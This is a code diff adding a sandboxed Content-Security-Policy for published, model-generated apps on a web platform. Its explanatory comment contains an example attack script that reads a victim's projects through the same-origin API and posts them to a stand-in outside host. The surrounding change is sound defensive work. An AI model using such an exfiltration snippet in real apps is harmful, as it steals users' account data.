@@ -76,6 +76,68 @@ const CSP = [
   "object-src 'none'"
 ].join("; ");
 
+/* =================================================================
+   PUBLISHED APPS GET THEIR OWN ORIGIN
+   -----------------------------------------------------------------
+   A published app is served from /s/<slug> — on souqi.site itself, the
+   same origin as the dashboard. Its JavaScript is written by a model, at
+   the direction of whoever published it, and the platform authenticates
+   with a cookie and nothing else: no CSRF token, and SameSite=Lax is no
+   help at all against a page that IS the same site.
+
+   So, before this, anyone could publish an app whose script did:
+
+       const mine = await (await fetch("/api/projects")).json();
+       fetch("https://somewhere-else/collect", { method: "POST",
+             body: JSON.stringify(mine) });
+
+   — send the link to someone, and read that person's projects, account
+   and usage as them. The first fetch is same-origin so their session
+   cookie rides along and the response is readable; the second is allowed
+   because the platform CSP ends in connect-src https:, which is every
+   host on the internet.
+
+   `sandbox` fixes it at the root rather than by blocklisting: the page
+   is loaded into an OPAQUE origin, so it is no longer same-origin with
+   anything. /api is cross-origin to it, CORS applies, and the session
+   cookie is not sent. What it keeps is everything an app needs to be an
+   app — scripts, forms, popups, and a click-driven navigation, which is
+   how the Stripe redirect leaves the page.
+
+   allow-same-origin is the one flag deliberately absent. Adding it back
+   undoes the whole of this.
+
+   THE TRADE, written down because it is real: an opaque origin has no
+   cookies, no localStorage and no IndexedDB, so a published app cannot
+   persist anything in the browser. Payments still work — those two
+   endpoints are public by design, take no credentials, and now say so in
+   CORS. This lands while nothing is published yet, which is the only
+   moment it costs nobody anything; after that, someone's app breaks.
+   ================================================================= */
+const PUBLISHED_CSP = [
+  "sandbox allow-scripts allow-forms allow-popups allow-modals" +
+    " allow-popups-to-escape-sandbox allow-top-navigation-by-user-activation",
+  "default-src 'self'",
+  // A generated app legitimately loads its own bundle and inline styles.
+  "script-src 'self' 'unsafe-inline' " + PREVIEW_FALLBACK_CDN + " " + WEBCONTAINER_CDN + " " + STRIPE_SCRIPT,
+  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
+  "font-src 'self' data: https://fonts.gstatic.com",
+  // Models reach for stock photography constantly; blocking it would break
+  // most published apps for no security gain the sandbox does not already
+  // give — an opaque origin has nothing worth exfiltrating.
+  "img-src 'self' data: blob: https:",
+  "connect-src 'self' https:",
+  "frame-src 'self' " + STRIPE_FRAME,
+  "frame-ancestors 'self'",
+  "base-uri 'self'",
+  "object-src 'none'"
+].join("; ");
+
+/** The published-site route, and only it. */
+function isPublishedSite(p) {
+  return p === "/s" || p.indexOf("/s/") === 0;
+}
+
 module.exports = function securityHeaders(req, res, next) {
   res.setHeader("X-Content-Type-Options", "nosniff");
   res.setHeader("X-Frame-Options", "SAMEORIGIN");
@@ -123,7 +185,9 @@ module.exports = function securityHeaders(req, res, next) {
      for the statically served copies. Everywhere else it bought nothing and
      cost the previews. */
   res.setHeader("Cross-Origin-Resource-Policy", "same-origin");
-  if (!process.env.CSP_DISABLED) res.setHeader("Content-Security-Policy", CSP);
+  if (!process.env.CSP_DISABLED) {
+    res.setHeader("Content-Security-Policy", isPublishedSite(req.path || "") ? PUBLISHED_CSP : CSP);
+  }
   if (isProd) res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
   next();
 };
